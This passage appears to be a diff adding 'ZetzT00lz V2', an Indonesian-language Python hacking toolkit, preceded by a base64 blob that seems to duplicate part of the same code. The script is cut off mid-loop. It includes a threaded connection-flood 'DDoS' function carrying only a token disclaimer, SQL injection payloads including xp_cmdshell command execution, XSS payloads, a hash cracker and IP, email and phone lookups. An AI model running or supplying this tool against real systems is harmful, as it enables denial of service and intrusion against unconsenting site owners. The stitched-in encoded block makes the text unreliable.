SBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIAogICAgICAgIGlmIG5vdCB2dWxuZXJhYmxlOgogICAgICAgICAgICBwcmludChmIntGb3JlLlJFRH1bLV0gVGlkYWsgZGl0ZW11a2FuIGtlcmVudGFuYW4gU1FMIEluamVjdGlvbiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gU2l0dXMgbXVuZ2tpbiByZW50YW4gU1FMIEluamVjdGlvbiEiKQogICAgCiAgICBkZWYgcGFzc3dvcmRfY3JhY2tlcihzZWxmLCBoYXNoX3ZhbHVlLCBoYXNoX3R5cGU9J21kNScsIHdvcmRsaXN0PU5vbmUpOgogICAgICAgICIiIlBhc3N3b3JkIGNyYWNrZXIgc2VkZXJoYW5hIiIiCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkNZQU59WypdIENyYWNraW5nIGhhc2g6IHtoYXNoX3ZhbHVlfSIpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfVsqXSBIYXNoIHR5cGU6IHtoYXNoX3R5cGV9IikKICAgICAgICAKICAgICAgICAjIFdvcmRsaXN0IGRlZmF1bHQKICAgICAgICBpZiBub3Qgd29yZGxpc3Q6CiAgICAgICAgICAgIHdvcmRsaXN0ID0gWwogICAgICAgICAgICAgICAgJ3Bhc3N3b3JkJywgJzEyMzQ1NicsICdhZG1pbicsICdxd2VydHknLCAncGFzc3dvcmQxMjMnLAogICAgICAgICAgICAgICAgJ2FkbWluMTIzJywgJ2xldG1laW4nLCAnd2VsY29tZScsICdtb25rZXknLCAnMTIzNDU2Nzg5JwogICAgICAgICAgICBdCiAgICAgICAgCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIAogICAgICAgIGZvciB3b3JkIGluIHdvcmRsaXN0OgogICAgICAgICAgICAjIEhhc2gga2F0YSBzZXN1YWkgdGlwZQogICAgICAgICAgICBpZiBoYXNoX3R5cGUubG93ZXIoKSA9PSAnbWQ1JzoKICAgICAgICAgICAgICAgIGhhc2hlZCA9IGhhc2hsaWIubWQ1KHdvcmQuZW5jb2RlKCkpLmhleGRpZ2VzdCgpCiAgICAgICAgICAgIGVsaWYgaGFzaF90eXBlLmxvd2VyKCkgPT0gJ3NoYTEnOgogICAgICAgICAgICAgICAgaGFzaGVkID0gaGFzaGxpYi5zaGExKHdvcmQuZW5jb2RlKCkpLmhleGRpZ2VzdCgpCiAgICAgICAgICAgIGVsaWYgaGFzaF90eXBlLmxvd2VyKCkgPT0gJ3NoYTI1Nic6CiAgICAgICAgICAgICAgICBoYXNoZWQgPSBoYXNobGliLnNoYTI1Nih3b3JkLmVuY29kZSgpKS5oZXhkaWdlc3QoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9W+Kcl10gSGFzaCB0eXBlIHRpZGFrIGRpZHVrdW5nIikKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5ZRUxMT1d9WyFdIFRlc3Rpbmc6IHt3b3JkfSIsIGVuZD0nXHInKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgaGFzaGVkID09IGhhc2hfdmFsdWUubG93ZXIoKToKICAgICAgICAgICAgICAgIHByaW50KGYiXG57Rm9yZS5HUkVFTn1bK10gUEFTU1dPUkQgRElURU1VS0FOOiB7d29yZH0iKQogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgIAogICAgICAgIGlmIG5vdCBmb3VuZDoKICAgICAgICAgICAgcHJpbnQoZiJcbntGb3JlLlJFRH1bLV0gUGFzc3dvcmQgdGlkYWsgZGl0ZW11a2FuIGRhbGFtIHdvcmRsaXN0IikKICAgIAogICAgZGVmIHhzc19zY2FubmVyKHNlbGYsIHVybCk6CiAgICAgICAgIiIiU2Nhbm5lciBYU1Mgc2VkZXJoYW5hIiIiCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkNZQU59WypdIFNjYW5uaW5nIFhTUzoge3VybH0iKQogICAgICAgIAogICAgICAgICMgUGF5bG9hZCBYU1MKICAgICAgICBwYXlsb2FkcyA9IFsKICAgICAgICAgICAgJzxzY3JpcHQ+YWxlcnQoIlhTUyIpPC9zY3JpcHQ+JywKICAgICAgICAgICAgJzxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgiWFNTIik+JywKICAgICAgICAgICAgJzxzdmcvb25sb2FkPWFsZXJ0KCJYU1MiKT4nLAogICAgICAgICAgICAnXCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PicsCiAgICAgICAgICAgICdqYXZhc2NyaXB0OmFsZXJ0KCJYU1MiKScKICAgICAgICBdCiAgICAgICAgCiAgICAgICAgdnVsbmVyYWJsZSA9IEZhbHNlCiAgICAgICAgCiAgICAgICAgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHM6CiAgICAgICAgICAgIHRlc3RfdXJsID0gZiJ7dXJsfXt1cmxsaWIucGFyc2UucXVvdGUocGF5bG9hZCl9IgogICAgICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bIV0gVGVzdGluZyBwYXlsb2FkLi4uIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHRlc3RfdXJsLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHBheWxvYWQucmVwbGFjZSgnPCcsICcmbHQ7Jykgbm90IGluIHJlc3BvbnNlLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgaWYgcGF5bG9hZCB
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+ZetzT00lz V2 - Advanced Pentesting Toolkit
+Created by: DeemZet
+Version: 2.0
+"""
+
+import os
+import sys
+import socket
+import requests
+import json
+import threading
+import time
+import random
+import subprocess
+import re
+import hashlib
+import urllib.parse
+from datetime import datetime
+from colorama import init, Fore, Style
+
+# Initialize colorama
+init(autoreset=True)
+
+# Password untuk akses
+ACCESS_PASSWORD = "DimzGanteng"
+
+# ASCII Art dengan warna
+ASCII_ART = f"""
+{Fore.CYAN} _____    _         _____           _      __     ______  
+{Fore.CYAN}|__  /___| |_ ____ |_   _|__   ___ | |____ \\ \\   / /___ \\ 
+{Fore.CYAN}  / // _ \\ __|_  /   | |/ _ \\ / _ \\| |_  /  \\ \\ / /  __) |
+{Fore.CYAN} / /|  __/ |_ / /    | | (_) | (_) | |/ /    \\ V /  / __/ 
+{Fore.CYAN}/____\\___|\\__/___|   |_|\\___/ \\___/|_/___|    \\_/  |_____|
+{Fore.YELLOW}                                                      v2.0
+"""
+
+class ZetzT00lzV2:
+    def __init__(self):
+        self.running = True
+        self.session = requests.Session()
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+        ]
+        self.get_system_info()
+        
+    def get_system_info(self):
+        """Mendapatkan informasi sistem user"""
+        try:
+            # IP Public
+            try:
+                self.public_ip = requests.get('https://api.ipify.org').text
+            except:
+                self.public_ip = "Tidak terdeteksi"
+            
+            # OS Info
+            self.os_name = os.name
+            if os.name == 'posix':
+                self.os_detail = subprocess.getoutput('uname -a')
+            else:
+                self.os_detail = sys.platform
+            
+            # Device/Username
+            self.username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'Unknown')
+            
+        except Exception as e:
+            self.public_ip = "Error"
+            self.os_detail = "Unknown"
+            self.username = "Unknown"
+    
+    def clear_screen(self):
+        """Membersihkan layar"""
+        os.system('clear' if os.name == 'posix' else 'cls')
+    
+    def print_banner(self):
+        """Menampilkan banner"""
+        self.clear_screen()
+        print(ASCII_ART)
+        print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════╗")
+        print(f"{Fore.GREEN}║               SYSTEM INFORMATION                         ║")
+        print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════╣")
+        print(f"{Fore.CYAN}║ Public IP    : {self.public_ip:<43} ║")
+        print(f"{Fore.CYAN}║ OS           : {self.os_detail[:45]:<45} ║")
+        print(f"{Fore.CYAN}║ User         : {self.username:<43} ║")
+        print(f"{Fore.CYAN}║ Time         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<43} ║")
+        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════╝")
+        print()
+    
+    def login(self):
+        """Login dengan password"""
+        self.print_banner()
+        print(f"{Fore.YELLOW}[!] Masukkan password untuk mengakses ZetzT00lz V2")
+        
+        attempts = 3
+        while attempts > 0:
+            password = input(f"{Fore.WHITE}[?] Password: {Fore.RESET}")
+            if password == ACCESS_PASSWORD:
+                print(f"{Fore.GREEN}[✓] Akses diberikan! Memuat tools...")
+                time.sleep(1)
+                return True
+            else:
+                attempts -= 1
+                print(f"{Fore.RED}[✗] Password salah! Sisa percobaan: {attempts}")
+        
+        print(f"{Fore.RED}[!] Akses ditolak! Program dihentikan.")
+        return False
+    
+    def osint_ip_tracker(self, ip_address):
+        """Melacak informasi IP"""
+        print(f"\n{Fore.CYAN}[*] Melacak IP: {ip_address}")
+        
+        try:
+            # Menggunakan ipapi.co
+            response = requests.get(f'https://ipapi.co/{ip_address}/json/')
+            data = response.json()
+            
+            if 'error' not in data:
+                print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║                    IP TRACKER RESULTS                    ║")
+                print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════╣")
+                print(f"{Fore.CYAN}║ IP Address    : {data.get('ip', 'N/A'):<43} ║")
+                print(f"{Fore.CYAN}║ City          : {data.get('city', 'N/A'):<43} ║")
+                print(f"{Fore.CYAN}║ Region        : {data.get('region', 'N/A'):<43} ║")
+                print(f"{Fore.CYAN}║ Country       : {data.get('country_name', 'N/A'):<43} ║")
+                print(f"{Fore.CYAN}║ ISP           : {data.get('org', 'N/A'):<43} ║")
+                print(f"{Fore.CYAN}║ Latitude      : {data.get('latitude', 'N/A'):<43} ║")
+                print(f"{Fore.CYAN}║ Longitude     : {data.get('longitude', 'N/A'):<43} ║")
+                print(f"{Fore.CYAN}║ Timezone      : {data.get('timezone', 'N/A'):<43} ║")
+                print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════╝")
+                
+                # Google Maps link
+                if 'latitude' in data and 'longitude' in data:
+                    print(f"{Fore.YELLOW}[+] Google Maps: https://maps.google.com/?q={data['latitude']},{data['longitude']}")
+            else:
+                print(f"{Fore.RED}[✗] IP tidak valid atau tidak ditemukan")
+                
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Error: {e}")
+    
+    def osint_email_tracker(self, email):
+        """Melacak informasi email"""
+        print(f"\n{Fore.CYAN}[*] Melacak Email: {email}")
+        
+        # Cek format email
+        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
+            print(f"{Fore.RED}[✗] Format email tidak valid")
+            return
+        
+        print(f"{Fore.YELLOW}[!] Memeriksa kebocoran data...")
+        time.sleep(1)
+        
+        # Simulasi pemeriksaan (dalam real implementation bisa integrate dengan API)
+        print(f"{Fore.GREEN}[+] Email valid: {email}")
+        print(f"{Fore.YELLOW}[!] Tips: Gunakan haveibeenpwned.com untuk cek kebocoran data")
+        
+        # Ekstrak domain email
+        domain = email.split('@')[1]
+        print(f"{Fore.CYAN}[*] Domain email: {domain}")
+        print(f"{Fore.YELLOW}[!] Lakukan WHOIS lookup untuk domain tersebut")
+    
+    def osint_phone_tracker(self, phone):
+        """Melacak informasi nomor telepon"""
+        print(f"\n{Fore.CYAN}[*] Melacak Nomor: {phone}")
+        
+        # Hapus karakter non-digit
+        clean_phone = re.sub(r'\D', '', phone)
+        
+        if len(clean_phone) < 8:
+            print(f"{Fore.RED}[✗] Nomor telepon terlalu pendek")
+            return
+        
+        print(f"{Fore.YELLOW}[!] Menganalisis format nomor...")
+        time.sleep(1)
+        
+        # Deteksi kode negara (sederhana)
+        if clean_phone.startswith('62'):
+            country = "Indonesia"
+            print(f"{Fore.GREEN}[+] Kode negara terdeteksi: Indonesia (+62)")
+        elif clean_phone.startswith('1'):
+            country = "USA/Canada"
+            print(f"{Fore.GREEN}[+] Kode negara terdeteksi: USA/Canada (+1)")
+        elif clean_phone.startswith('44'):
+            country = "UK"
+            print(f"{Fore.GREEN}[+] Kode negara terdeteksi: UK (+44)")
+        else:
+            country = "Unknown"
+            print(f"{Fore.YELLOW}[!] Kode negara tidak dikenali")
+        
+        print(f"{Fore.YELLOW}[!] Catatan: Pelacakan lengkap membutuhkan API berbayar")
+    
+    def ddos_attack(self, target, port=80, threads=100, duration=30):
+        """Melakukan DDoS attack (EDUCATIONAL PURPOSE ONLY)"""
+        print(f"\n{Fore.RED}[!] PERINGATAN: DDoS ILLEGAL tanpa izin!")
+        print(f"{Fore.YELLOW}[!] Ini hanya untuk edukasi dan testing sistem sendiri")
+        
+        confirm = input(f"{Fore.WHITE}[?] Lanjutkan? (y/n): {Fore.RESET}").lower()
+        if confirm != 'y':
+            return
+        
+        print(f"\n{Fore.CYAN}[*] Memulai DDoS attack ke {target}:{port}")
+        print(f"{Fore.CYAN}[*] Threads: {threads}, Durasi: {duration} detik")
+        
+        attack_count = 0
+        stop_attack = False
+        
+        def attack_thread():
+            nonlocal attack_count
+            while not stop_attack:
+                try:
+                    # Membuat socket connection
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    sock.connect((target, port))
+                    
+                    # Mengirim packet
+                    sock.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
+                    sock.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
+                    sock.close()
+                    
+                    attack_count += 1
+                    
+                except Exception as e:
+                    continue
+        
+        # Start threads
+        thread_list = []
+        start_time = time.time()
+        
+        for i in range(threads):
+            thread = threading.Thread(target=attack_thread)
+            thread.daemon = True
+            thread.start()
+            thread_list.append(thread)
+        
+        print(f"{Fore.YELLOW}[!] Attack berjalan... Tekan Ctrl+C untuk berhenti")
+        
+        try:
+            while time.time() - start_time < duration:
+                time.sleep(1)
+                print(f"{Fore.CYAN}[*] Packets terkirim: {attack_count}", end='\r')
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}[!] Attack dihentikan oleh user")
+        
+        stop_attack = True
+        time.sleep(1)
+        
+        print(f"\n{Fore.GREEN}[+] Attack selesai!")
+        print(f"{Fore.GREEN}[+] Total packets terkirim: {attack_count}")
+    
+    def sql_injection_scanner(self, url):
+        """Scanner SQL Injection sederhana"""
+        print(f"\n{Fore.CYAN}[*] Scanning SQL Injection: {url}")
+        
+        # Daftar payload SQL Injection
+        payloads = [
+            "'",
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' UNION SELECT NULL--",
+            "' AND 1=CONVERT(int, @@version)--",
+            "' EXEC xp_cmdshell('dir')--"
+        ]
+        
+        vulnerable = False
+        
+        for payload in payloads:
+            test_url = f"{url}{payload}"
+            print(f"{Fore.YELLOW}[!] Testing: {payload[:20]}...")
+            
+            try:
+                headers = {'User-Agent': random.choice(self.user_agents)}
+                response = requests.get(test_url, headers=headers, timeout=5)
+                
+                # Deteksi error SQL
+                sql_errors = [
+                    'sql syntax',
+                    'mysql_fetch',
+                    'mysql_num_rows',
+                    'you have an error in your sql',
+                    'warning: mysql',
+                    'unclosed quotation mark',
+                    'sql server',
+                    'odbc driver',
+                    'postgresql'
+                ]
+                
+                for error in sql_errors:
+                    if error in response.text.lower():
+                        print(f"{Fore.GREEN}[+] VULNERABLE! Payload: {payload}")
+                        print(f"{Fore.GREEN}[+] Error ditemukan: {error}")
+                        vulnerable = True
+                        break
+                        
+            except Exception as e:
+                continue
+        
+        if not vulnerable:
+            print(f"{Fore.RED}[-] Tidak ditemukan kerentanan SQL Injection")
+        else:
+            print(f"{Fore.GREEN}[+] Situs mungkin rentan SQL Injection!")
+    
+    def password_cracker(self, hash_value, hash_type='md5', wordlist=None):
+        """Password cracker sederhana"""
+        print(f"\n{Fore.CYAN}[*] Cracking hash: {hash_value}")
+        print(f"{Fore.CYAN}[*] Hash type: {hash_type}")
+        
+        # Wordlist default
+        if not wordlist:
+            wordlist = [
+                'password', '123456', 'admin', 'qwerty', 'password123',
+                'admin123', 'letmein', 'welcome', 'monkey', '123456789'
+            ]
+        
+        found = False
+        
+        for word in wordlist:
+            # Hash kata sesuai tipe
+            if hash_type.lower() == 'md5':
+                hashed = hashlib.md5(word.encode()).hexdigest()
+            elif hash_type.lower() == 'sha1':
+                hashed = hashlib.sha1(word.encode()).hexdigest()
+            elif hash_type.lower() == 'sha256':
+                hashed = hashlib.sha256(word.encode()).hexdigest()
+            else:
+                print(f"{Fore.RED}[✗] Hash type tidak didukung")
+                return
+            
+            print(f"{Fore.YELLOW}[!] Testing: {word}", end='\r')
+            
+            if hashed == hash_value.lower():
+                print(f"\n{Fore.GREEN}[+] PASSWORD DITEMUKAN: {word}")
+                found = True
+                break
+        
+        if not found:
+            print(f"\n{Fore.RED}[-] Password tidak ditemukan dalam wordlist")
+    
+    def xss_scanner(self, url):
+        """Scanner XSS sederhana"""
+        print(f"\n{Fore.CYAN}[*] Scanning XSS: {url}")
+        
+        # Payload XSS
+        payloads = [
+            '<script>alert("XSS")</script>',
+            '<img src=x onerror=alert("XSS")>',
+            '<svg/onload=alert("XSS")>',
+            '\"><script>alert(1)</script>',
+            'javascript:alert("XSS")'
+        ]
+        
+        vulnerable = False
+        
+        for payload in payloads:
+            test_url = f"{url}{urllib.parse.quote(payload)}"
+            print(f"{Fore.YELLOW}[!] Testing payload...")
+            
+            try:
+                response = requests.get(test_url, timeout=5)
+                
+                if payload.replace('<', '&lt;') not in response.text:
+                    if payload in response.text or payload.replace('<', '&lt;') in response.text:
+                        print(f"{Fore.GREEN}[+] Mungkin VULNERABLE ke XSS!")
+                        print(f"{Fore.GREEN}[+] Payload: {payload[:30]}...")
+                        vulnerable = True
+                        
+            except Exception as e:
+                continue
+        
+        if not vulnerable:
+            print(f"{Fore.RED}[-] Tidak ditemukan kerentanan XSS")
+    
+    def whois_lookup(self, domain):
+        """WHOIS lookup untuk domain"""
+        print(f"\n{Fore.CYAN}[*] WHOIS Lookup: {domain}")
+        
+        try:
+            # Menggunakan whois command jika tersedia
+            if os.name == 'posix':
+                result = subprocess.getoutput(f'whois {domain}')
+                print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║                    WHOIS RESULTS                         ║")
+                print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════╣")
+                
+                lines = result.split('\n')
+                important_lines = [
+                    'Domain Name:', 'Registrar:', 'Creation Date:', 
+                    'Expiration Date:', 'Name Server:', 'Registrant:',
+                    'Admin:', 'Tech:', 'Status:'
+                ]
+                
+                for line in lines[:30]:  # Tampilkan 30 baris pertama
+                    for important in important_lines:
+                        if important.lower() in line.lower():
+                            print(f"{Fore.CYAN}║ {line[:60]:<60} ║")
+                            break
+                
+                print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════╝")
+            else:
+                # Fallback ke API online
+                print(f"{Fore.YELLOW}[!] Gunakan whois di Linux atau kunjungi:")
+                print(f"{Fore.YELLOW}[!] https://who.is/whois/{domain}")
+                
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Error: {e}")
+            print(f"{Fore.YELLOW}[!] Kunjungi: https://who.is/whois/{domain}")
+    
+    def show_help(self):
+        """Menampilkan menu help"""
+        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗")
+        print(f"{Fore.CYAN}║                     ZetzT00lz V2 - HELP MENU                        ║")
+        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════╣")
+        print(f"{Fore.YELLOW}║ Command                 Description                               ║")
+        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════╣")
+        print(f"{Fore.GREEN}║ ip <address>            OSINT IP Tracker                          ║")
+        print(f"{Fore.GREEN}║ email <address>         OSINT Email Tracker                       ║")
+        print(f"{Fore.GREEN}║ phone <number>          OSINT Phone Tracker                       ║")
+        print(f"{Fore.GREEN}║ ddos <target> [port]    DDoS Attack (EDUCATIONAL)                 ║")
+        print(f"{Fore.GREEN}║ sql <url>               SQL Injection Scanner                     ║")
+        print(f"{Fore.GREEN}║ crack <hash> [type]     Password Cracker (md5/sha1/sha256)        ║")
+        print(f"{Fore.GREEN}║ xss <url>               XSS Scanner                               ║")
+        print(f"{Fore.GREEN}║ whois <domain>          WHOIS Domain Lookup                       ║")
+        print(f"{Fore.GREEN}║ sysinfo                 Show System Information                   ║")
+        print(f"{Fore.GREEN}║ clear                   Clear Screen                              ║")
+        print(f"{Fore.GREEN}║ help                    Show This Menu                            ║")
+        print(f"{Fore.GREEN}║ exit                    Exit Program                              ║")
+        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════╝")
+        print()
+    
+    def run(self):
+        """Menjalankan main program"""
+        if not self.login():
+            return
+        
+        while self.running:
+            try:
+                self.print_banner()
+                cmd = input(f"\n{Fore.RED}ZetzT00lz{Fore.WHITE}@{Fore.CYAN}{self.username}{Fore.WHITE}:~# {Fore.RESET}").strip()
+                
+                if not cmd:
+                    continue
+                
+                parts = cmd.split()
+                command = parts[0].lower()
+                
+                if command == "exit":
+                    print(f"\n{Fore.YELLOW}[!] Keluar dari ZetzT00lz V2...")
+                    self.running = False
+                
+                elif command == "help":
+                    self.show_help()
+                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
+                
+                elif command == "clear":
+                    continue
+                
+                elif command == "sysinfo":
+                    self.print_banner()
+                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
+                
+                elif command == "ip" and len(parts) > 1:
+                    self.osint_ip_tracker(parts[1])
+                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
+                
+                elif command == "email" and len(parts) > 1:
+                    self.osint_email_tracker(parts[1])
+                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
+                
+                elif command == "phone" and len(parts) > 1:
+                    self.osint_phone_tracker(parts[1])
+                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
+                
+                elif command == "ddos" and len(parts) > 1:
+          
